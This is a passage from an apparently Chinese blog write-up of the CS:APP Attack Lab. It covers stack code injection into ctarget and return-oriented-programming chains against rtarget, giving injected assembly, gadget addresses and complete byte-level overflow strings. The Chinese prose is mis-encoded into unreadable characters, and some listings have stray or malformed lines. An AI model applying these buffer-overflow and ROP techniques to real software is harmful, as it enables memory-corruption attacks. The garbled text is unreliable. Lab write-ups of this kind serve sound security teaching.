<p><code>0x5561dca8</code>ÔºåËøôÂ∞±ÊòØÂ≠óÁ¨¶‰∏≤Â≠òÊîæÁöÑ‰ΩçÁΩÆÔºå‰πüÊòØË∞ÉÁî®<code>touch3</code>Â∫îËØ•‰º†ÂÖ•ÁöÑÂèÇÊï∞ÔºåÂèà<code>touch3</code>‰ª£Á†ÅÁöÑÂú∞ÂùÄ‰∏∫<code>4018fa</code>„ÄÇ‰ªéËÄåÂæóÂà∞‰ª£Á†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">pushq</span>   <span class="err">$</span><span class="mh">0x4018fa</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â≠óËäÇÁ∫ßË°®Á§∫‰∏∫Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="nl">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mo">0000000000000000</span> <span class="o">&lt;</span><span class="p">.</span><span class="n">text</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">   <span class="mi">0</span><span class="o">:</span>   <span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="n">a8</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span>    <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl">   <span class="mi">7</span><span class="o">:</span>   <span class="mi">68</span> <span class="n">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mo">00</span>          <span class="n">pushq</span>  <span class="err">$</span><span class="mh">0x4018fa</span>
</span></span><span class="line"><span class="cl">   <span class="nl">c</span><span class="p">:</span>   <span class="n">c3</span>                      <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="Ê†àÂ∏ßËÆ≤Ëß£">Ê†àÂ∏ßËÆ≤Ëß£
</h3><p>Êàë‰ª¨ÊúüÊúõÁöÑÊ†àÂ∏ß‰∏∫</p>
<p><img src="https://pic4.zhimg.com/80/v2-dcd7fd081b2c60ed0443adfa044fbb27_1440w.webp"
	
	
	
	loading="lazy"
	
		alt="Âõæ3"
	
	
></p>
<p>ÈÄªËæëÂ¶Ç‰∏ãÔºö</p>
<ul>
<li><code>getbuf</code>ÊâßË°å<code>ret</code>Ôºå‰ªéÊ†à‰∏≠ÂºπÂá∫ËøîÂõûÂú∞ÂùÄÔºåË∑≥ËΩ¨Âà∞Êàë‰ª¨Ê≥®ÂÖ•ÁöÑ‰ª£Á†Å</li>
<li>‰ª£Á†ÅÊâßË°åÔºåÂÖàÂ∞ÜÂ≠òÂú®<code>caller</code>ÁöÑÊ†à‰∏≠ÁöÑÂ≠óÁ¨¶‰∏≤‰º†ÁªôÂèÇÊï∞ÂØÑÂ≠òÂô®<code>%rdi</code>ÔºåÂÜçÂ∞Ü<code>touch3</code>ÁöÑÂú∞ÂùÄÂéãÂÖ•Ê†à‰∏≠</li>
<li>‰ª£Á†ÅÊâßË°å<code>ret</code>Ôºå‰ªéÊ†à‰∏≠ÂºπÂá∫<code>touch3</code>Êåá‰ª§ÔºåÊàêÂäüË∑≥ËΩ¨</li>
</ul>
<h3 id="solution">Solution
</h3><p>cookie<code>0x59b997fa</code>‰Ωú‰∏∫Â≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫<code>ASCII</code>‰∏∫Ôºö<code>35 39 62 39 39 37 66 61</code></p>
<p>Ê≥®ÂÖ•‰ª£Á†ÅÊÆµÁöÑÂú∞ÂùÄ‰∏é‰∏äÈ¢ò‰∏ÄÊ†∑ÔºåÂêåÊ†∑‰∏∫<code>0x5561dc78</code></p>
<p>Áî±‰∫éÂú®<code>test</code>Ê†àÂ∏ß‰∏≠Â§öÂà©Áî®‰∫Ü‰∏Ä‰∏™Â≠óËäÇÂ≠òÊîæcookieÔºåÊâÄ‰ª•Êú¨È¢òË¶ÅËæìÂÖ•56‰∏™Â≠óËäÇ„ÄÇÊ≥®ÂÖ•‰ª£Á†ÅÁöÑÂ≠óËäÇË°®Á§∫ÊîæÂú®ÂºÄÂ§¥Ôºå33-40‰∏™Â≠óËäÇÊîæÁΩÆÊ≥®ÂÖ•‰ª£Á†ÅÁöÑÂú∞ÂùÄÁî®Êù•Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄÔºåÊúÄÂêéÂÖ´‰∏™Â≠óËäÇÂ≠òÊîæcookieÁöÑ<code>ASCII</code> „ÄÇ‰∫éÊòØÂæóÂà∞Â¶Ç‰∏ãËæìÂÖ•Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="n">a8</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span> <span class="mi">68</span> 
</span></span><span class="line"><span class="cl"><span class="n">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mo">00</span> <span class="n">c3</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mi">78</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mi">35</span> <span class="mi">39</span> <span class="mi">62</span> <span class="mi">39</span> <span class="mi">39</span> <span class="mi">37</span> <span class="mi">66</span> <span class="mi">61</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://pic3.zhimg.com/80/v2-02b3d0c6b65d967b6c66cbbc2ec0d2de_1440w.webp"
	
	
	
	loading="lazy"
	
		alt="Âõæ4"
	
	
></p>
<p><strong>ÊîªÂáªÊàêÂäüÔºÅ</strong></p>
<h2 id="part-iireturn-oriented-programing">Part II:Return-Oriented Programing
</h2><p>Âú®Á¨¨‰∫åÈÉ®ÂàÜ‰∏≠ÔºåÊàë‰ª¨Ë¶ÅÊîªÂáªÁöÑÊòØrtargetÔºå‰ªñÁöÑ‰ª£Á†ÅÂÜÖÂÆπÂíåÁ¨¨‰∏ÄÈÉ®ÂàÜ‰∏ÄËá¥Ôºå‰ΩÜÈááÁî®‰∫Ü‰∏§ÁßçÁ≠ñÁï•Êù•ÈòªÊ≠¢ÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊîªÂáª</p>
<ul>
<li>Ê†àÈöèÊú∫Âåñ
<ul>
<li>ËøôÊÆµÁ®ãÂ∫èÂàÜÈÖçÁöÑÊ†àÁöÑ‰ΩçÁΩÆÊ≠£ÊØèÊ¨°ËøêË°åÊó∂ÈÉΩÊòØÈöèÊú∫ÁöÑÔºåËøôÂ∞±‰ΩøÊàë‰ª¨Êó†Ê≥ïÁ°ÆÂÆöÂú®Âì™ÈáåÊèíÂÖ•‰ª£Á†Å</li>
</ul>
</li>
<li>ÈôêÂà∂ÂèØÊâßË°å‰ª£Á†ÅÂå∫Âüü
<ul>
<li>‰πüÂ∞±ÊòØÂ≠òÊîæÂú®Ê†à‰∏äÁöÑ‰ª£Á†Å‰∏çÂèØÊâßË°åÔºå‰ΩøÂæóÊèíÂÖ•ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÊó†Ê≥ïÊâßË°å</li>
</ul>
</li>
</ul>
<p>ÈíàÂØπËøô‰∫õÈò≤Âæ°Êé™ÊñΩÔºåÊñáÊ°£Êèê‰æõ‰∫ÜÊîªÂáªÁ≠ñÁï•ÔºåÂç≥<strong>ROPÔºöÈù¢ÂêëËøîÂõûÁöÑÁ®ãÂ∫èËÆæËÆ°</strong>ÔºåÂ∞±ÊòØÂú®Â∑≤ÁªèÂ≠òÂú®ÁöÑÁ®ãÂ∫è‰∏≠ÊâæÂà∞ÁâπÂÆöÁöÑ‰ª•<code>ret</code>ÁªìÂ∞æÁöÑÊåá‰ª§Â∫èÂàó‰∏∫Êàë‰ª¨ÊâÄÁî®ÔºåÁß∞ËøôÊ†∑ÁöÑ‰ª£Á†ÅÊÆµ‰∏∫<code>gadget</code>ÔºåÊääË¶ÅÁî®Âà∞ÈÉ®ÂàÜÁöÑÂú∞ÂùÄÂéãÂÖ•Ê†à‰∏≠ÔºåÊØèÊ¨°<code>ret</code>ÂêéÂèà‰ºöÂèñÂá∫‰∏Ä‰∏™Êñ∞ÁöÑ<code>gadget</code>Ôºå‰∫éÊòØËøôÊ†∑Â∞±ËÉΩÂΩ¢Êàê‰∏Ä‰∏™Á®ãÂ∫èÈìæÔºåÂÆûÁé∞Êàë‰ª¨ÁöÑÁõÆÁöÑ„ÄÇ<strong>ÊàëÂñúÊ¨¢Â∞ÜËøôÁßçÊîªÂáªÊñπÂºèÁß∞‰Ωú‚ÄúÂ∞±Âú∞ÂèñÊùêÔºåÊãºÂáë‰ª£Á†Å‚Äù</strong>„ÄÇ</p>
<p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733.png"
	width="1029"
	height="582"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733_hu7106984471997724594.png 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733_hu16357492657825526984.png 1024w"
	loading="lazy"
	
		alt="Âõæ5"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="424px"
	
></p>
<p>ÂêåÊó∂‰πüÁªôÂá∫Êåá‰ª§ÁºñÁ†ÅË°®</p>
<p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601.png"
	width="1117"
	height="1141"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601_hu3870573879609345137.png 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601_hu11996603093128378326.png 1024w"
	loading="lazy"
	
		alt="Âõæ6"
	
	
		class="gallery-image" 
		data-flex-grow="97"
		data-flex-basis="234px"
	
></p>
<p><strong>‰∏æ‰∏™‰æãÂ≠êÔºö</strong></p>
<p><code>rtarget</code>ÊúâËøôÊ†∑‰∏Ä‰∏™ÂáΩÊï∞Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">setval_210</span><span class="p">(</span><span class="kt">unsigned</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">3347663060U</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÆÉÁöÑÊ±áÁºñ‰ª£Á†ÅÂ≠óËäÇÁ∫ßË°®Á§∫‰∏∫Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mf">0000000000400f</span><span class="mi">15</span> <span class="o">&lt;</span><span class="n">setval_210</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">    <span class="mf">400f</span><span class="mi">15</span><span class="o">:</span> <span class="n">c7</span> <span class="mo">07</span> <span class="n">d4</span> <span class="mi">48</span> <span class="mi">89</span> <span class="n">c7</span>   <span class="n">movl</span> <span class="err">$</span><span class="mh">0xc78948d4</span><span class="p">,(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="mf">400f</span><span class="mi">1</span><span class="nl">b</span><span class="p">:</span> <span class="n">c3</span>                  <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êü•Ë°®ÂèØÁü•ÔºåÂèñÂÖ∂‰∏≠‰∏ÄÈÉ®ÂàÜÂ≠óËäÇÂ∫èÂàó 48 89 c7 Â∞±Ë°®Á§∫Êåá‰ª§<code>movq %rax, %rdi</code>ÔºåËøôÊï¥Âè•Êåá‰ª§ÁöÑÂú∞ÂùÄ‰∏∫<code>0x400f15</code>Ôºå‰∫éÊòØ‰ªé<code>0x400f18</code>ÂºÄÂßãÁöÑ‰ª£Á†ÅÂ∞±ÂèØ‰ª•ÂèòÊàê‰∏ãÈù¢ËøôÊ†∑Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëøô‰∏™Â∞èÁâáÊÆµÂ∞±ÂèØ‰ª•‰Ωú‰∏∫‰∏Ä‰∏™<code>gadget</code>‰∏∫Êàë‰ª¨ÊâÄÁî®„ÄÇ</p>
<p>ÂÖ∂ÂÆÉ‰∏Ä‰∫õÂèØ‰ª•Âà©Áî®ÁöÑ‰ª£Á†ÅÈÉΩÂú®Êñá‰ª∂<code>farm.c</code>‰∏≠Â±ïÁ§∫‰∫ÜÂá∫Êù•</p>
<h3 id="level1">level1
</h3><p>Êú¨È¢òÁöÑ‰ªªÂä°Âíåphase2Áõ∏ÂêåÔºåÈÉΩÊòØË¶ÅÊ±ÇËøîÂõûÂà∞touch2ÂáΩÊï∞Ôºåphase2‰∏≠Áî®Âà∞ÁöÑÊ≥®ÂÖ•‰ª£Á†Å‰∏∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x59b997fa</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">pushq</span>   <span class="err">$</span><span class="mh">0x4017ec</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áî±‰∫éÊàë‰ª¨Êó†Ê≥ïÊâæÂà∞Ëøô‰∏™ÁâπÂÆöÂÄºÁöÑgadgetÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÂÖàÂ∞ÜÊàë‰ª¨ÈúÄË¶ÅÁöÑÂÄºÂÜôÂÖ•Ê†à‰∏≠ÔºåÂÜçÂà©Áî®popÂëΩ‰ª§Â∞ÜÂÖ∂popÂà∞rdiÂØÑÂ≠òÂô®‰∏≠ÔºåÊúÄÂêéÂÜçËøîÂõûtouch2ÁöÑÂáΩÊï∞Ëµ∑ÂßãÂú∞ÂùÄÔºå‰ªªÂä°‰æøÂÆåÊàê„ÄÇ</p>
<p>‰ΩÜÊòØfarm‰∏≠Êâæ‰∏çÂà∞popÂà∞rdiÂØÑÂ≠òÂô®Êåá‰ª§ÁöÑgadgetÔºåÊâÄ‰ª•Êàë‰ª¨Âè¶ËæüËπäÂæÑÔºåÂÖàpopÂà∞rax‰∏≠ÔºåÂÜçmov %raxÔºå%rdiÔºåÂç≥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">popq</span> <span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl"><span class="cp">#############
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">mov</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w.webp"
	width="1241"
	height="726"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu2488226402346328207.webp 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu10118464121499149602.webp 1024w"
	loading="lazy"
	
		alt="Âõæ7"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="410px"
	
></p>
<p>ÈÄªËæëÂ¶Ç‰∏ãÔºö</p>
<ul>
<li><code>getbuf</code>ÊâßË°å<code>ret</code>Ôºå‰ªéÊ†à‰∏≠ÂºπÂá∫ËøîÂõûÂú∞ÂùÄÔºåË∑≥ËΩ¨Âà∞Êàë‰ª¨ÁöÑ<code>gadget01</code></li>
<li><code>gadget01</code>ÊâßË°åÔºåÂ∞Ü<code>cookie</code>ÂºπÂá∫ÔºåËµãÂÄºÁªô<code>%rax</code>ÔºåÁÑ∂ÂêéÊâßË°å<code>ret</code>ÔºåÁªßÁª≠ÂºπÂá∫ËøîÂõûÂú∞ÂùÄÔºåË∑≥ËΩ¨Âà∞<code>gadget2</code></li>
<li><code>gadget2</code>ÊâßË°åÔºåÂ∞Ü<code>cookie</code>ÂÄºÊàêÂäüËµãÂÄºÁªôÂèÇÊï∞ÂØÑÂ≠òÂô®<code>%rdi</code>ÔºåÁÑ∂ÂêéÊâßË°å<code>ret</code>ÔºåÁªßÁª≠ÂºπÂá∫ËøîÂõûÂú∞ÂùÄÔºåË∑≥ËΩ¨Âà∞<code>touch2</code></li>
</ul>
<h3 id="solution-1">Solution
</h3><p>È¶ñË¶ÅÈóÆÈ¢òÊòØÊâæÂà∞Êàë‰ª¨ÈúÄË¶ÅÁöÑ<code>gadget</code></p>
<p>ÂÖàÁî®Â¶Ç‰∏ãÊåá‰ª§ÂæóÂà∞<code>target</code>ÁöÑÊ±áÁºñ‰ª£Á†ÅÂèäÂ≠óËäÇÁ∫ßË°®Á§∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">objdump -d rtarget &gt; rtarget.s
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êü•Ë°®Áü•Ôºå<code>pop %rax</code>Áî®<code>58</code>Ë°®Á§∫Ôºå‰∫éÊòØÊü•Êâæ<code>58</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">a7</span> <span class="o">&lt;</span><span class="n">addval_219</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">a7</span><span class="p">:</span>       <span class="mi">8</span><span class="n">d</span> <span class="mi">87</span> <span class="mi">51</span> <span class="mi">73</span> <span class="mi">58</span> <span class="mi">90</span>       <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x6fa78caf</span><span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">ad</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>                   <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæóÂà∞Êåá‰ª§Âú∞ÂùÄ‰∏∫<code>0x4019ab</code></p>
<p><code>movq %rax, %rdi</code>Ë°®Á§∫‰∏∫<code>48 89 c7</code>ÔºåÂàöÂ•ΩËÉΩÊâæÂà∞ÔºÅÂÖ∂‰∏≠ 90 Ë°®Á§∫‚ÄúÁ©∫‚ÄùÔºåÂèØ‰ª•ÂøΩÁï•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">c3</span> <span class="o">&lt;</span><span class="n">setval_426</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">c3</span><span class="p">:</span>       <span class="n">c7</span> <span class="mo">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="n">c7</span> <span class="mi">90</span>       <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x90c78948</span><span class="p">,(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">c9</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæóÂà∞Êåá‰ª§Âú∞ÂùÄ‰∏∫<code>0x4019c5</code></p>
<p>Ê†πÊçÆ‰∏äÂõæÁöÑÊ†àÂ∏ßÔºåÂ∞±ËÉΩÂÜôÂá∫ËæìÂÖ•Â∫èÂàóÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">ab 19 40 00 00 00 00 00
</span></span><span class="line"><span class="cl">fa 97 b9 59 00 00 00 00
</span></span><span class="line"><span class="cl">c5 19 40 00 00 00 00 00
</span></span><span class="line"><span class="cl">ec 17 40 00 00 00 00 00
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="level2">level2
</h3><p>Êù•Ëá™ÂÆòÊñπÁöÑÂäùÈÄÄÂìàÂìàÂìàÔºåBefore you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That‚Äôs a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p>
<p>ËøôÈÅìÈ¢ò‰∏ªË¶ÅÊòØÂú®rtarget‰∏≠ËøîÂõûÂà∞touch3ÔºåÁúã‰ººÊ≤°ÊúâÈöæÂ∫¶</p>
<p><code>Phase 3</code>‰∏≠Áî®Âà∞ÁöÑÊ≥®ÂÖ•‰ª£Á†Å‰∏∫Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">pushq</span>   <span class="err">$</span><span class="mh">0x4018fa</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÖ∂‰∏≠<code>0x5561dca8</code>ÊòØÊ†à‰∏≠<code>cookie</code>Â≠òÊîæÁöÑÂú∞ÂùÄ„ÄÇ</p>
<p>Âú®Êú¨È¢ò‰∏≠Áî±‰∫éÊ†àÈöèÊú∫ÂåñÔºå‰∏çËÉΩÁõ¥Êé•Â∞Ü<code>0x5561dca8</code>Âú∞ÂùÄÁõ¥Êé•Áªô%rdiÔºåÂèØ‰ª•Âà©Áî®%rspÁöÑÁõ∏ÂØπÂÅèÁßªÈáèÊù•Ëé∑ÂèñcookieÁöÑÂ≠òÊîæÂú∞ÂùÄÔºå</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">movq   $0x30(%rsp), %rdi
</span></span><span class="line"><span class="cl">movq   %rsp, %rax
</span></span><span class="line"><span class="cl">movq   %rax, %rdi
</span></span><span class="line"><span class="cl">lea    (%rdi,%rsi,1),%rax
</span></span><span class="line"><span class="cl">movq   %rax, %rdi
</span></span><span class="line"><span class="cl">movl   %eax, %edi
</span></span><span class="line"><span class="cl">movl   %eax, %edx
</span></span><span class="line"><span class="cl">movl   %esp, %eax
</span></span><span class="line"><span class="cl">movl   %ecx, %esi
</span></span><span class="line"><span class="cl">pushq   $0x4018fa
</span></span><span class="line"><span class="cl">ret
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êü•Ë°®Ôºå<code>movq %rsp, xxx</code>Ë°®Á§∫‰∏∫<code>48 89 xx</code>ÔºåÊü•Êâæ‰∏Ä‰∏ãÊúâÊ≤°ÊúâÂèØÁî®ÁöÑ<code>gadget</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="n">aab</span> <span class="o">&lt;</span><span class="n">setval_350</span><span class="o">&gt;:</span>
